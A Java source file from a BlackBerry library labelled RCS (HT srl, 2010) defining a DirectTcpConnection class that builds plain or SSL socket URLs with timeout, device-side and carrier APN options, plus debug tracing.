//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : SocketConnection.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.transfer;

import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;

// TODO: Auto-generated Javadoc
/**
 * The Class DirectTcpConnection.
 */
public final class DirectTcpConnection extends Connection {

    public static final int METHOD_FIRST = 0;
    public static final int METHOD_DEVICE = 0;
    public static final int METHOD_NODEVICE = 1;
    public static final int METHOD_NULL = 2;
    public static final int METHOD_APN = 3;
    public static final int METHOD_LAST = 3;

    //#ifdef DEBUG
    static Debug debug = new Debug("DirectTcp", DebugLevel.VERBOSE);

    //#endif

    private final String host;
    private final int port;
    private final boolean ssl;

    int timeout = 3 * 60 * 1000;

    String apn = "ibox.tim.it";
    String user = "";
    String password = "";

    int method;

    // Constructor
    /**
     * Instantiates a new direct tcp connection.
     * 
     * @param host_
     *            the host_
     * @param port_
     *            the port_
     * @param ssl_
     *            the ssl_
     * @param method_
     *            the method
     */
    public DirectTcpConnection(final String host_, final int port_,
            final boolean ssl_, final int method_) {
        host = host_;
        port = port_;
        ssl = ssl_;
        method = method_;

        if (ssl) {
            url = "ssl://" + host + ":" + port + ";ConnectionTimeout="
                    + timeout;

        } else {
            url = "socket://" + host + ":" + port + ";ConnectionTimeout="
                    + timeout;
        }

        switch (method) {
        case METHOD_DEVICE:
            url += ";deviceside=true";
            break;
        case METHOD_NODEVICE:
            url += ";deviceside=false";
            break;
        case METHOD_NULL:
            break;
        case METHOD_APN:
            url += ";deviceside=true;apn=" + apn + ";tunnelauthusername="
                    + user + ";tunnelauthpassword=" + password;
            break;
        }

        //#ifdef DEBUG_TRACE
        debug.trace("method: " + method + " url: " + url);
        //#endif
    }

    /*
     * (non-Javadoc)
     * @see blackberry.transfer.Connection#error(java.lang.String)
     */
    protected void error(final String string) {
        //#ifdef DEBUG
        debug.error(string);
        //#endif
    }

    /*
     * (non-Javadoc)
     * @see blackberry.transfer.Connection#isActive()
     */
    public synchronized boolean isActive() {
        return true;
    }

    /*
     * (non-Javadoc)
     * @see blackberry.transfer.Connection#trace(java.lang.String)
     */
    protected void trace(final String string) {
        //#ifdef DEBUG_TRACE
        debug.trace(string);
        //#endif
    }
}
